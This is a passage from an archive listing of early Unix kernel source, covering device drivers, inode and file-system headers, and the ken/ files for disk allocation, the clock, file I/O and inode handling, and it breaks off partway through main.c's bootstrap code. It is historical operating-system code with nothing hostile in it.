		sleep(&vs.oq, TTIPRI);
	}
	putc(c, &vs.oq);
	vsxintr();
	spl0();
}

vsxintr()
{
	static lchar;
	register c;
	register int *xcsr;

	xcsr = &VSADDR->vsxcsr;
	if (*xcsr&DONE) {
		if (lchar==MAGIC_MAP) {
			*xcsr =& ~RQSEND;
			lchar = 0;
			if (vs.oq.c_cc==0)
				goto wake;
		}
		if ((*xcsr&CLSEND) == 0) {
			*xcsr =& ~RQSEND;
			*xcsr =| RQSEND;
			if ((*xcsr&CLSEND) == 0)
				goto wake;
		}
		if ((c = getc(&vs.oq)) >= 0)
			VSADDR->vsxbuf = lchar = c;
		if (vs.oq.c_cc <= 15)
	    wake:
			wakeup(&vs.oq);
	}
}

vsread(dev)
{
	register int c;

	spl5();
	while ((c = getc(&vs.iq)) < 0)
		sleep(&vs.iq, TTIPRI);
	spl0();
	passc("?0*#?546?213?879?"[c&017]);
}

vsrintr()
{
	register int c;

	c = VSADDR->vsrbuf;
	if (vs.iq.c_cc<=10)
		putc(c, &vs.iq);
	wakeup(&vs.iq);
}
-- /usr/sys/dmr/vt.c mode=0100664 uid=3 gid=3 atime=174922019 mtime=174843412 --
#
/*
 */

/*
 * VT01 driver via DR11C to 11/20
 */

#include "../param.h"
#include "../user.h"

int	vtflag;

struct vtreg {
	int	csr;
	int	buf;
};

#define	VTADDR	0167770
#define	RQINT	01
#define	BIENABL	040
#define	SEOF	0100000
#define	VTPRI	8

vtopen(dev, flag)
{
	if (!flag)
		u.u_error = ENXIO;
	else
		VTADDR->csr = BIENABL;
}

vtclose()
{
	VTADDR->buf = SEOF;
	VTADDR->csr =| RQINT;
}

vtwrite()
{
	register int c;
	int register count;

	while ((c=cpass()) >= 0) {
	    retry:
		for (count=0; count<10; count++)
			if ((VTADDR->csr&RQINT)==0) {
				VTADDR->buf = c&0377;
				VTADDR->csr =| RQINT;
				goto contin;
			}
		spl5();
		if (VTADDR->csr&RQINT) {
			vtflag++;
			sleep(VTADDR, VTPRI);
		}
		spl0();
		goto retry;
    contin:;
	}
}

vtintr()
{
	VTADDR->csr =& ~RQINT;
	if (vtflag) {
		vtflag = 0;
		wakeup(VTADDR);
	}
}
-- /usr/sys/file.h mode=0100664 uid=3 gid=3 atime=174921997 mtime=169261008 --
/*
 * One file structure is allocated
 * for each open/creat/pipe call.
 * Main use is to hold the read/write
 * pointer associated with each open
 * file.
 */
struct	file
{
	char	f_flag;
	char	f_count;	/* reference count */
	int	f_inode;	/* pointer to inode structure */
	char	*f_offset[2];	/* read/write character pointer */
} file[NFILE];

/* flags */
#define	FREAD	01
#define	FWRITE	02
#define	FPIPE	04
-- /usr/sys/filsys.h mode=0100664 uid=3 gid=3 atime=174923536 mtime=169261008 --
/*
 * Definition of the unix super block.
 * The root super block is allocated and
 * read in iinit/alloc.c. Subsequently
 * a super block is allocated and read
 * with each mount (smount/sys3.c) and
 * released with unmount (sumount/sys3.c).
 * A disk block is ripped off for storage.
 * See alloc.c for general alloc/free
 * routines for free list and I list.
 */
struct	filsys
{
	int	s_isize;	/* size in blocks of I list */
	int	s_fsize;	/* size in blocks of entire volume */
	int	s_nfree;	/* number of in core free blocks (0-100) */
	int	s_free[100];	/* in core free blocks */
	int	s_ninode;	/* number of in core I nodes (0-100) */
	int	s_inode[100];	/* in core free I nodes */
	char	s_flock;	/* lock during free list manipulation */
	char	s_ilock;	/* lock during I list manipulation */
	char	s_fmod;		/* super block modified flag */
	char	s_ronly;	/* mounted read-only flag */
	int	s_time[2];	/* current date of last update */
	int	pad[50];
};
-- /usr/sys/ino.h mode=0100664 uid=3 gid=3 atime=174923536 mtime=169261008 --
/*
 * Inode structure as it appears on
 * the disk. Not used by the system,
 * but by things like check, df, dump.
 */
struct	inode
{
	int	i_mode;
	char	i_nlink;
	char	i_uid;
	char	i_gid;
	char	i_size0;
	char	*i_size1;
	int	i_addr[8];
	int	i_atime[2];
	int	i_mtime[2];
};

/* modes */
#define	IALLOC	0100000
#define	IFMT	060000
#define		IFDIR	040000
#define		IFCHR	020000
#define		IFBLK	060000
#define	ILARG	010000
#define	ISUID	04000
#define	ISGID	02000
#define ISVTX	01000
#define	IREAD	0400
#define	IWRITE	0200
#define	IEXEC	0100
-- /usr/sys/inode.h mode=0100664 uid=3 gid=3 atime=174921997 mtime=174906361 --
/*
 * The I node is the focus of all
 * file activity in unix. There is a unique
 * inode allocated for each active file,
 * each current directory, each mounted-on
 * file, text file, and the root. An inode is 'named'
 * by its dev/inumber pair. (iget/iget.c)
 * Data, from mode on, is read in
 * from permanent inode on volume.
 */
struct	inode
{
	char	i_flag;
	char	i_count;	/* reference count */
	int	i_dev;		/* device where inode resides */
	int	i_number;	/* i number, 1-to-1 with device address */
	int	i_mode;
	char	i_nlink;	/* directory entries */
	char	i_uid;		/* owner */
	char	i_gid;		/* group of owner */
	char	i_size0;	/* most significant of size */
	char	*i_size1;	/* least sig */
	int	i_addr[8];	/* device addresses constituting file */
	int	i_lastr;	/* last logical block read (for read-ahead) */
} inode[NINODE];

/* flags */
#define	ILOCK	01		/* inode is locked */
#define	IUPD	02		/* inode has been modified */
#define	IACC	04		/* inode access time to be updated */
#define	IMOUNT	010		/* inode is mounted on */
#define	IWANT	020		/* some process waiting on lock */
#define	ITEXT	040		/* inode is pure text prototype */

/* modes */
#define	IALLOC	0100000		/* file is used */
#define	IFMT	060000		/* type of file */
#define		IFDIR	040000	/* directory */
#define		IFCHR	020000	/* character special */
#define		IFBLK	060000	/* block special, 0 is regular */
#define	ILARG	010000		/* large addressing algorithm */
#define	ISUID	04000		/* set user id on execution */
#define	ISGID	02000		/* set group id on execution */
#define ISVTX	01000		/* save swapped text even after use */
#define	IREAD	0400		/* read, write, execute permissions */
#define	IWRITE	0200
#define	IEXEC	0100
-- /usr/sys/ken mode=0140775 uid=3 gid=3 atime=174929533 mtime=174921816 --
-- /usr/sys/ken/alloc.c mode=0110664 uid=3 gid=3 atime=174921610 mtime=174843185 --
#
/*
 */

#include "../param.h"
#include "../systm.h"
#include "../filsys.h"
#include "../conf.h"
#include "../buf.h"
#include "../inode.h"
#include "../user.h"

/*
 * iinit is called once (from main)
 * very early in initialization.
 * It reads the root's super block
 * and initializes the current date
 * from the last modified date.
 *
 * panic: iinit -- cannot read the super
 * block. Usually because of an IO error.
 */
iinit()
{
	register *cp, *bp;

	(*bdevsw[rootdev.d_major].d_open)(rootdev, 1);
	bp = bread(rootdev, 1);
	cp = getblk(NODEV);
	if(u.u_error)
		panic("iinit");
	bcopy(bp->b_addr, cp->b_addr, 256);
	brelse(bp);
	mount[0].m_bufp = cp;
	mount[0].m_dev = rootdev;
	cp = cp->b_addr;
	cp->s_flock = 0;
	cp->s_ilock = 0;
	cp->s_ronly = 0;
	time[0] = cp->s_time[0];
	time[1] = cp->s_time[1];
}

/*
 * alloc will obtain the next available
 * free disk block from the free list of
 * the specified device.
 * The super block has up to 100 remembered
 * free blocks; the last of these is read to
 * obtain 100 more . . .
 *
 * no space on dev x/y -- when
 * the free list is exhausted.
 */
alloc(dev)
{
	int bno;
	register *bp, *ip, *fp;

	fp = getfs(dev);
	while(fp->s_flock)
		sleep(&fp->s_flock, PINOD);
	do {
		if(fp->s_nfree <= 0)
			goto nospace;
		bno = fp->s_free[--fp->s_nfree];
		if(bno == 0)
			goto nospace;
	} while (badblock(fp, bno, dev));
	if(fp->s_nfree <= 0) {
		fp->s_flock++;
		bp = bread(dev, bno);
		ip = bp->b_addr;
		fp->s_nfree = *ip++;
		bcopy(ip, fp->s_free, 100);
		brelse(bp);
		fp->s_flock = 0;
		wakeup(&fp->s_flock);
	}
	bp = getblk(dev, bno);
	clrbuf(bp);
	fp->s_fmod = 1;
	return(bp);

nospace:
	fp->s_nfree = 0;
	prdev("no space", dev);
	u.u_error = ENOSPC;
	return(NULL);
}

/*
 * place the specified disk block
 * back on the free list of the
 * specified device.
 */
free(dev, bno)
{
	register *fp, *bp, *ip;

	fp = getfs(dev);
	fp->s_fmod = 1;
	while(fp->s_flock)
		sleep(&fp->s_flock, PINOD);
	if (badblock(fp, bno, dev))
		return;
	if(fp->s_nfree <= 0) {
		fp->s_nfree = 1;
		fp->s_free[0] = 0;
	}
	if(fp->s_nfree >= 100) {
		fp->s_flock++;
		bp = getblk(dev, bno);
		ip = bp->b_addr;
		*ip++ = fp->s_nfree;
		bcopy(fp->s_free, ip, 100);
		fp->s_nfree = 0;
		bwrite(bp);
		fp->s_flock = 0;
		wakeup(&fp->s_flock);
	}
	fp->s_free[fp->s_nfree++] = bno;
	fp->s_fmod = 1;
}

/*
 * Check that a block number is in the
 * range between the I list and the size
 * of the device.
 * This is used mainly to check that a
 * garbage file system has not been mounted.
 *
 * bad block on dev x/y -- not in range
 */
badblock(afp, abn, dev)
{
	register struct filsys *fp;
	register char *bn;

	fp = afp;
	bn = abn;
	if (bn < fp->s_isize+2 || bn >= fp->s_fsize) {
		prdev("bad block", dev);
		return(1);
	}
	return(0);
}

/*
 * Allocate an unused I node
 * on the specified device.
 * Used with file creation.
 * The algorithm keeps up to
 * 100 spare I nodes in the
 * super block. When this runs out,
 * a linear search through the
 * I list is instituted to pick
 * up 100 more.
 */
ialloc(dev)
{
	register *fp, *bp, *ip;
	int i, j, k, ino;

	fp = getfs(dev);
	while(fp->s_ilock)
		sleep(&fp->s_ilock, PINOD);
loop:
	if(fp->s_ninode > 0) {
		ino = fp->s_inode[--fp->s_ninode];
		ip = iget(dev, ino);
		if (ip==NULL)
			return(NULL);
		if(ip->i_mode == 0) {
			for(bp = &ip->i_mode; bp < &ip->i_addr[8];)
				*bp++ = 0;
			fp->s_fmod = 1;
			return(ip);
		}
		/*
		 * Inode was allocated after all.
		 * Look some more.
		 */
		iput(ip);
		goto loop;
	}
	fp->s_ilock++;
	ino = 0;
	for(i=0; i<fp->s_isize; i++) {
		bp = bread(dev, i+2);
		ip = bp->b_addr;
		for(j=0; j<256; j=+16) {
			ino++;
			if(ip[j] != 0)
				continue;
			for(k=0; k<NINODE; k++)
			if(dev==inode[k].i_dev && ino==inode[k].i_number)
				goto cont;
			fp->s_inode[fp->s_ninode++] = ino;
			if(fp->s_ninode >= 100)
				break;
		cont:;
		}
		brelse(bp);
		if(fp->s_ninode >= 100)
			break;
	}
	fp->s_ilock = 0;
	wakeup(&fp->s_ilock);
	if (fp->s_ninode > 0)
		goto loop;
	prdev("Out of inodes", dev);
	u.u_error = ENOSPC;
	return(NULL);
}

/*
 * Free the specified I node
 * on the specified device.
 * The algorithm stores up
 * to 100 I nodes in the super
 * block and throws away any more.
 */
ifree(dev, ino)
{
	register *fp;

	fp = getfs(dev);
	if(fp->s_ilock)
		return;
	if(fp->s_ninode >= 100)
		return;
	fp->s_inode[fp->s_ninode++] = ino;
	fp->s_fmod = 1;
}

/*
 * getfs maps a device number into
 * a pointer to the incore super
 * block.
 * The algorithm is a linear
 * search through the mount table.
 * A consistency check of the
 * in core free-block and i-node
 * counts.
 *
 * bad count on dev x/y -- the count
 *	check failed. At this point, all
 *	the counts are zeroed which will
 *	almost certainly lead to "no space"
 *	diagnostic
 * panic: no fs -- the device is not mounted.
 *	this "cannot happen"
 */
getfs(dev)
{
	register struct mount *p;
	register char *n1, *n2;

	for(p = &mount[0]; p < &mount[NMOUNT]; p++)
	if(p->m_bufp != NULL && p->m_dev == dev) {
		p = p->m_bufp->b_addr;
		n1 = p->s_nfree;
		n2 = p->s_ninode;
		if(n1 > 100 || n2 > 100) {
			prdev("bad count", dev);
			p->s_nfree = 0;
			p->s_ninode = 0;
		}
		return(p);
	}
	panic("no fs");
}

/*
 * update is the internal name of
 * 'sync'. It goes through the disk
 * queues to initiate sandbagged IO;
 * goes through the I nodes to write
 * modified nodes; and it goes through
 * the mount table to initiate modified
 * super blocks.
 */
update()
{
	register struct inode *ip;
	register struct mount *mp;
	register *bp;

	if(updlock)
		return;
	updlock++;
	for(mp = &mount[0]; mp < &mount[NMOUNT]; mp++)
		if(mp->m_bufp != NULL) {
			ip = mp->m_bufp->b_addr;
			if(ip->s_fmod==0 || ip->s_ilock!=0 ||
			   ip->s_flock!=0 || ip->s_ronly!=0)
				continue;
			bp = getblk(mp->m_dev, 1);
			ip->s_fmod = 0;
			ip->s_time[0] = time[0];
			ip->s_time[1] = time[1];
			bcopy(ip, bp->b_addr, 256);
			bwrite(bp);
		}
	for(ip = &inode[0]; ip < &inode[NINODE]; ip++)
		if((ip->i_flag&ILOCK) == 0) {
			ip->i_flag =| ILOCK;
			iupdat(ip, time);
			prele(ip);
		}
	updlock = 0;
	bflush(NODEV);
}
-- /usr/sys/ken/clock.c mode=0100664 uid=3 gid=3 atime=174921622 mtime=174908010 --
#
#include "../param.h"
#include "../systm.h"
#include "../user.h"
#include "../proc.h"

#define	UMODE	0170000
#define	SCHMAG	10

/*
 * clock is called straight from
 * the real time clock interrupt.
 *
 * Functions:
 *	reprime clock
 *	copy *switches to display
 *	implement callouts
 *	maintain user/system times
 *	maintain date
 *	profile
 *	tout wakeup (sys sleep)
 *	lightning bolt wakeup (every 4 sec)
 *	alarm clock signals
 *	jab the scheduler
 */
clock(dev, sp, r1, nps, r0, pc, ps)
{
	register struct callo *p1, *p2;
	register struct proc *pp;

	/*
	 * restart clock
	 */

	*lks = 0115;

	/*
	 * display register
	 */

	display();

	/*
	 * callouts
	 * if none, just return
	 * else update first non-zero time
	 */

	if(callout[0].c_func == 0)
		goto out;
	p2 = &callout[0];
	while(p2->c_time<=0 && p2->c_func!=0)
		p2++;
	p2->c_time--;

	/*
	 * if ps is high, just return
	 */

	if((ps&0340) != 0)
		goto out;

	/*
	 * callout
	 */

	spl5();
	if(callout[0].c_time <= 0) {
		p1 = &callout[0];
		while(p1->c_func != 0 && p1->c_time <= 0) {
			(*p1->c_func)(p1->c_arg);
			p1++;
		}
		p2 = &callout[0];
		while(p2->c_func = p1->c_func) {
			p2->c_time = p1->c_time;
			p2->c_arg = p1->c_arg;
			p1++;
			p2++;
		}
	}

	/*
	 * lightning bolt time-out
	 * and time of day
	 */

out:
	if((ps&UMODE) == UMODE) {
		u.u_utime++;
		if(u.u_prof[3])
			incupc(pc, u.u_prof);
	} else
		u.u_stime++;
	pp = u.u_procp;
	if(++pp->p_cpu == 0)
		pp->p_cpu--;
	if(++lbolt >= HZ) {
		if((ps&0340) != 0)
			return;
		lbolt =- HZ;
		if(++time[1] == 0)
			++time[0];
		spl1();
		if(time[1]==tout[1] && time[0]==tout[0])
			wakeup(tout);
		if((time[1]&03) == 0) {
			runrun++;
			wakeup(&lbolt);
		}
		for(pp = &proc[0]; pp < &proc[NPROC]; pp++)
		if (pp->p_stat) {
			if(pp->p_time != 127)
				pp->p_time++;
			if((pp->p_cpu & 0377) > SCHMAG)
				pp->p_cpu =- SCHMAG; else
				pp->p_cpu = 0;
			if(pp->p_pri > PUSER)
				setpri(pp);
		}
		if(runin!=0) {
			runin = 0;
			wakeup(&runin);
		}
		if((ps&UMODE) == UMODE) {
			u.u_ar0 = &r0;
			if(issig())
				psig();
			setpri(u.u_procp);
		}
	}
}

/*
 * timeout is called to arrange that
 * fun(arg) is called in tim/HZ seconds.
 * An entry is sorted into the callout
 * structure. The time in each structure
 * entry is the number of HZ's more
 * than the previous entry.
 * In this way, decrementing the
 * first entry has the effect of
 * updating all entries.
 */
timeout(fun, arg, tim)
{
	register struct callo *p1, *p2;
	register t;
	int s;

	t = tim;
	s = PS->integ;
	p1 = &callout[0];
	spl7();
	while(p1->c_func != 0 && p1->c_time <= t) {
		t =- p1->c_time;
		p1++;
	}
	p1->c_time =- t;
	p2 = p1;
	while(p2->c_func != 0)
		p2++;
	while(p2 >= p1) {
		(p2+1)->c_time = p2->c_time;
		(p2+1)->c_func = p2->c_func;
		(p2+1)->c_arg = p2->c_arg;
		p2--;
	}
	p1->c_time = t;
	p1->c_func = fun;
	p1->c_arg = arg;
	PS->integ = s;
}
-- /usr/sys/ken/fio.c mode=0110664 uid=3 gid=3 atime=174921631 mtime=174843194 --
#
/*
 */

#include "../param.h"
#include "../user.h"
#include "../filsys.h"
#include "../file.h"
#include "../conf.h"
#include "../inode.h"
#include "../reg.h"

/*
 * Convert a user supplied
 * file descriptor into a pointer
 * to a file structure.
 * Only task is to check range
 * of the descriptor.
 */
getf(f)
{
	register *fp, rf;

	rf = f;
	if(rf<0 || rf>=NOFILE)
		goto bad;
	fp = u.u_ofile[rf];
	if(fp != NULL)
		return(fp);
bad:
	u.u_error = EBADF;
	return(NULL);
}

/*
 * Internal form of close.
 * Decrement reference count on
 * file structure and call closei
 * on last closef.
 * Also make sure the pipe protocol
 * does not constipate.
 */
closef(fp)
int *fp;
{
	register *rfp, *ip;

	rfp = fp;
	if(rfp->f_flag&FPIPE) {
		ip = rfp->f_inode;
		ip->i_mode =& ~(IREAD|IWRITE);
		wakeup(ip+1);
		wakeup(ip+2);
	}
	if(rfp->f_count <= 1)
		closei(rfp->f_inode, rfp->f_flag&FWRITE);
	rfp->f_count--;
}

/*
 * Decrement reference count on an
 * inode due to the removal of a
 * referencing file structure.
 * On the last closei, switchout
 * to the close entry point of special
 * device handler.
 * Note that the handler gets called
 * on every open and only on the last
 * close.
 */
closei(ip, rw)
int *ip;
{
	register *rip;
	register dev, maj;

	rip = ip;
	dev = rip->i_addr[0];
	maj = rip->i_addr[0].d_major;
	if(rip->i_count <= 1)
	switch(rip->i_mode&IFMT) {

	case IFCHR:
		(*cdevsw[maj].d_close)(dev, rw);
		break;

	case IFBLK:
		(*bdevsw[maj].d_close)(dev, rw);
	}
	iput(rip);
}

/*
 * openi called to allow handler
 * of special files to initialize and
 * validate before actual IO.
 * Called on all sorts of opens
 * and also on mount.
 */
openi(ip, rw)
int *ip;
{
	register *rip;
	register dev, maj;

	rip = ip;
	dev = rip->i_addr[0];
	maj = rip->i_addr[0].d_major;
	switch(rip->i_mode&IFMT) {

	case IFCHR:
		if(maj >= nchrdev)
			goto bad;
		(*cdevsw[maj].d_open)(dev, rw);
		break;

	case IFBLK:
		if(maj >= nblkdev)
			goto bad;
		(*bdevsw[maj].d_open)(dev, rw);
	}
	return;

bad:
	u.u_error = ENXIO;
}

/*
 * Check mode permission on inode pointer.
 * Mode is READ, WRITE or EXEC.
 * In the case of WRITE, the
 * read-only status of the file
 * system is checked.
 * Also in WRITE, prototype text
 * segments cannot be written.
 * The mode is shifted to select
 * the owner/group/other fields.
 * The super user is granted all
 * permissions except for EXEC where
 * at least one of the EXEC bits must
 * be on.
 */
access(aip, mode)
int *aip;
{
	register *ip, m;

	ip = aip;
	m = mode;
	if(m == IWRITE) {
		if(getfs(ip->i_dev)->s_ronly != 0) {
			u.u_error = EROFS;
			return(1);
		}
		if(ip->i_flag & ITEXT) {
			u.u_error = ETXTBSY;
			return(1);
		}
	}
	if(u.u_uid == 0) {
		if(m == IEXEC && (ip->i_mode & 
			(IEXEC | (IEXEC>>3) | (IEXEC>>6))) == 0)
				goto bad;
		return(0);
	}
	if(u.u_uid != ip->i_uid) {
		m =>> 3;
		if(u.u_gid != ip->i_gid)
			m =>> 3;
	}
	if((ip->i_mode&m) != 0)
		return(0);

bad:
	u.u_error = EACCES;
	return(1);
}

/*
 * Look up a pathname and test if
 * the resultant inode is owned by the
 * current user.
 * If not, try for super-user.
 * If permission is granted,
 * return inode pointer.
 */
owner()
{
	register struct inode *ip;
	extern uchar();

	if ((ip = namei(uchar, 0)) == NULL)
		return(NULL);
	if(u.u_uid == ip->i_uid)
		return(ip);
	if (suser())
		return(ip);
	iput(ip);
	return(NULL);
}

/*
 * Test if the current user is the
 * super user.
 */
suser()
{

	if(u.u_uid == 0)
		return(1);
	u.u_error = EPERM;
	return(0);
}

/*
 * Allocate a user file descriptor.
 */
ufalloc()
{
	register i;

	for (i=0; i<NOFILE; i++)
		if (u.u_ofile[i] == NULL) {
			u.u_ar0[R0] = i;
			return(i);
		}
	u.u_error = EMFILE;
	return(-1);
}

/*
 * Allocate a user file descriptor
 * and a file structure.
 * Initialize the descriptor
 * to point at the file structure.
 *
 * no file -- if there are no available
 * 	file structures.
 */
falloc()
{
	register struct file *fp;
	register i;

	if ((i = ufalloc()) < 0)
		return(NULL);
	for (fp = &file[0]; fp < &file[NFILE]; fp++)
		if (fp->f_count==0) {
			u.u_ofile[i] = fp;
			fp->f_count++;
			fp->f_offset[0] = 0;
			fp->f_offset[1] = 0;
			return(fp);
		}
	printf("no file\n");
	u.u_error = ENFILE;
	return(NULL);
}
-- /usr/sys/ken/iget.c mode=0110664 uid=3 gid=3 atime=174921641 mtime=174906500 --
#
#include "../param.h"
#include "../systm.h"
#include "../user.h"
#include "../inode.h"
#include "../filsys.h"
#include "../conf.h"
#include "../buf.h"

/*
 * Look up an inode by device,inumber.
 * If it is in core (in the inode structure),
 * honor the locking protocol.
 * If it is not in core, read it in from the
 * specified device.
 * If the inode is mounted on, perform
 * the indicated indirection.
 * In all cases, a pointer to a locked
 * inode structure is returned.
 *
 * printf warning: no inodes -- if the inode
 *	structure is full
 * panic: no imt -- if the mounted file
 *	system is not in the mount table.
 *	"cannot happen"
 */
iget(dev, ino)
{
	register struct inode *p;
	register *ip2;
	int *ip1;
	register struct mount *ip;

loop:
	ip = NULL;
	for(p = &inode[0]; p < &inode[NINODE]; p++) {
		if(dev==p->i_dev && ino==p->i_number) {
			if((p->i_flag&ILOCK) != 0) {
				p->i_flag =| IWANT;
				sleep(p, PINOD);
				goto loop;
			}
			if((p->i_flag&IMOUNT) != 0) {
				for(ip = &mount[0]; ip < &mount[NMOUNT]; ip++)
				if(ip->m_inodp == p) {
					dev = ip->m_dev;
					ino = ROOTINO;
					goto loop;
				}
				panic("no imt");
			}
			p->i_count++;
			p->i_flag =| ILOCK;
			return(p);
		}
		if(ip==NULL && p->i_count==0)
			ip = p;
	}
	if((p=ip) == NULL) {
		printf("Inode table overflow\n");
		u.u_error = ENFILE;
		return(NULL);
	}
	p->i_dev = dev;
	p->i_number = ino;
	p->i_flag = ILOCK;
	p->i_count++;
	p->i_lastr = -1;
	ip = bread(dev, ldiv(ino+31,16));
	/*
	 * Check I/O errors
	 */
	if (ip->b_flags&B_ERROR) {
		brelse(ip);
		iput(p);
		return(NULL);
	}
	ip1 = ip->b_addr + 32*lrem(ino+31, 16);
	ip2 = &p->i_mode;
	while(ip2 < &p->i_addr[8])
		*ip2++ = *ip1++;
	brelse(ip);
	return(p);
}

/*
 * Decrement reference count of
 * an inode structure.
 * On the last reference,
 * write the inode out and if necessary,
 * truncate and deallocate the file.
 */
iput(p)
struct inode *p;
{
	register *rp;

	rp = p;
	if(rp->i_count == 1) {
		rp->i_flag =| ILOCK;
		if(rp->i_nlink <= 0) {
			itrunc(rp);
			rp->i_mode = 0;
			ifree(rp->i_dev, rp->i_number);
		}
		iupdat(rp, time);
		prele(rp);
		rp->i_flag = 0;
		rp->i_number = 0;
	}
	rp->i_count--;
	prele(rp);
}

/*
 * Check accessed and update flags on
 * an inode structure.
 * If either is on, update the inode
 * with the corresponding dates
 * set to the argument tm.
 */
iupdat(p, tm)
int *p;
int *tm;
{
	register *ip1, *ip2, *rp;
	int *bp, i;

	rp = p;
	if((rp->i_flag&(IUPD|IACC)) != 0) {
		if(getfs(rp->i_dev)->s_ronly)
			return;
		i = rp->i_number+31;
		bp = bread(rp->i_dev, ldiv(i,16));
		ip1 = bp->b_addr + 32*lrem(i, 16);
		ip2 = &rp->i_mode;
		while(ip2 < &rp->i_addr[8])
			*ip1++ = *ip2++;
		if(rp->i_flag&IACC) {
			*ip1++ = time[0];
			*ip1++ = time[1];
		} else
			ip1 =+ 2;
		if(rp->i_flag&IUPD) {
			*ip1++ = *tm++;
			*ip1++ = *tm;
		}
		bwrite(bp);
	}
}

/*
 * Free all the disk blocks associated
 * with the specified inode structure.
 * The blocks of the file are removed
 * in reverse order. This FILO
 * algorithm will tend to maintain
 * a contiguous free list much longer
 * than FIFO.
 */
itrunc(ip)
int *ip;
{
	register *rp, *bp, *cp;
	int *dp, *ep;

	rp = ip;
	if((rp->i_mode&(IFCHR&IFBLK)) != 0)
		return;
	for(ip = &rp->i_addr[7]; ip >= &rp->i_addr[0]; ip--)
	if(*ip) {
		if((rp->i_mode&ILARG) != 0) {
			bp = bread(rp->i_dev, *ip);
			for(cp = bp->b_addr+512; cp >= bp->b_addr; cp--)
			if(*cp) {
				if(ip == &rp->i_addr[7]) {
					dp = bread(rp->i_dev, *cp);
					for(ep = dp->b_addr+512; ep >= dp->b_addr; ep--)
					if(*ep)
						free(rp->i_dev, *ep);
					brelse(dp);
				}
				free(rp->i_dev, *cp);
			}
			brelse(bp);
		}
		free(rp->i_dev, *ip);
		*ip = 0;
	}
	rp->i_mode =& ~ILARG;
	rp->i_size0 = 0;
	rp->i_size1 = 0;
	rp->i_flag =| IUPD;
}

/*
 * Make a new file.
 */
maknode(mode)
{
	register *ip;

	ip = ialloc(u.u_pdir->i_dev);
	if (ip==NULL)
		return(NULL);
	ip->i_flag =| IACC|IUPD;
	ip->i_mode = mode|IALLOC;
	ip->i_nlink = 1;
	ip->i_uid = u.u_uid;
	ip->i_gid = u.u_gid;
	wdir(ip);
	return(ip);
}

/*
 * Write a directory entry with
 * parameters left as side effects
 * to a call to namei.
 */
wdir(ip)
int *ip;
{
	register char *cp1, *cp2;

	u.u_dent.u_ino = ip->i_number;
	cp1 = &u.u_dent.u_name[0];
	for(cp2 = &u.u_dbuf[0]; cp2 < &u.u_dbuf[DIRSIZ];)
		*cp1++ = *cp2++;
	u.u_count = DIRSIZ+2;
	u.u_segflg = 1;
	u.u_base = &u.u_dent;
	writei(u.u_pdir);
	iput(u.u_pdir);
}
-- /usr/sys/ken/main.c mode=0110664 uid=3 gid=3 atime=174921652 mtime=174906527 --
#
#include "../param.h"
#include "../user.h"
#include "../systm.h"
#include "../proc.h"
#include "../text.h"
#include "../inode.h"
#include "../seg.h"

#define	CLOCK1	0177546
#define	CLOCK2	0172540
/*
 * Icode is the octal bootstrap
 * program executed in user mode
 * to bring up the system.
 */
int	icode[]
{
	0104413,	/* sys exec; init; initp */
	0000014,
	0000010,
	0000777,	/* br . */
	0000014,	/* initp: init; 0 */
	0000000,
	0062457,	/* init: </etc/init\0> */
	0061564,
	0064457,
	0064556,
	0000164,
};

/*
 * Initialization code.
 * Called from m40.s or m45.s as
 * soon as a stack and segmentation
 * have been established.
 * Functions:
 *	clear and free user core
 *	find which clock is configured
 *	hand craft 0th process
 *	call all initialization routines
 *	fork - process 0 to schedule
 *	     - process 1 execute bootstrap
 *
 * panic: no clock -- neither clock responds
 * loop at loc 6 in user mode -- /etc/init
 *	cannot be executed.
 */
main()
{
	extern schar;
	register i, *p;

	/*
	 * zero and free all of core
	 */

	updlock = 0;
	i = *ka6 + USIZE;
	UISD->r[0] = 077406;
	for(;;) {
		UISA->r[0] = i;
		if(fuibyte(0) < 0)
			break;
		clearseg(i);
		maxmem++;
		mfree(coremap, 1, i);
		i++;
	}
	if(cputype == 70)
	for(i=0; i<62; i=+2) {
		UBMAP->r[i] = i<<12;
		UBMAP->r[i+1] = 0;
	}
	printf("mem = %l\n", maxmem*5/16);
	maxmem = min(maxmem, MAXMEM);
	mfree(swapmap, nswap, swplo);

	/*
	 * determine clock
	 */

	UISA->r[7] = ka6[1]; /* io segment */
	UISD->r[7] = 077406;
	lks = CLOCK1;
	if(fuiword(lks) == -1) {
		lks = CLOCK2;
		if(fuiword(lks) == -1)
			panic("no clock");
	}

	/*
	 * set up system process
	 */

	proc[0].p_addr = *ka6;
	proc[0].p_size = USIZE;
	proc[0].p_stat = SRUN;
	proc[0].p_flag =| SLOAD|SSYS;
	u.u_procp = &proc[0];

	/*
	 * set up 'known' i-nodes
	 */

	*lks = 0115;
	cinit();
	binit();
	iinit();
	rootdir = iget(rootdev, ROOTINO);
	rootdir->i_flag =& ~ILOCK;
	u.u_cdir = iget(rootdev, ROOTINO);
	u.u_cdir->i_flag =& ~ILOCK;

	/*
	 * make init process
	 * enter scheduling loop
	 * with system process
	 */

	if(newproc()) {
		expand(USIZE+1);
		estabur(0, 1, 0, 0);
		copyout(icode, 0, sizeof icode);
		/*
		 * Return goes to loc. 0 of user init
		 * code just copied out.
		 */
		return;
	}
	sched();
}

/*
 * Load the user hardware segmentation
 * registers from the software prototype.
 * The software registers must have
 * been setup prior by estabur.
 */
sureg()
{
	register *up, *rp, a;

	a = u.u_procp->p_addr;
	up = &u.u_uisa[16];
	rp = &UISA->r[16];
	if(cputype == 40) {
		up =- 8;
		rp =- 8;
	}
	while(rp > &UISA->r[0])
		*--rp = *--up + a;
	if((up=u.u_procp->p_textp) != NULL)
		a =- up->x_caddr;
	up = &u.u_uisd[16];
	rp = &UISD->r[16];
	if(cputype == 40) {
		up =- 8;
		rp =- 8;
	}
	while(rp > &UISD->r[0]) {
		*--rp = *--up;
		if((*rp & WO) == 0)
			rp[(UISA-UISD)/2] =- a;
	}
}

/*
 * Set up software prototype segmentation
 * registers to implement the 3 pseudo
 * text,data,stack segment sizes passed
 * as arguments.
 * The argument sep specifies if the
 * text and data+stack segments are to
 * be separated.
 */
estabur(nt, nd, ns, sep)
{
	register a, *ap, *dp;

	if(sep) {
		if(cputype == 40)
			goto err;
		if(nseg(nt) > 8 || nseg(nd)+nseg(ns) > 8)
			goto err;
	} else
		if(nseg(nt)+nseg(nd)+nseg(ns) > 8)
			goto err;
	if(nt+nd+ns+USIZE > maxmem)
		goto err;
	a = 0;
	ap = &u.u_uisa[0];
	dp = &u.u_uisd[0];
	while(nt >= 128) {
		*dp++ = (127<<8) | RO;
		*ap++ = a;
		a =+ 128;
		nt =- 128;
	}
	if(nt) {
		*dp++ = ((nt-1)<<8) | RO;
		*ap++ = a;
	}
	if(sep)
	while(ap < &u.u_uisa[8]) {
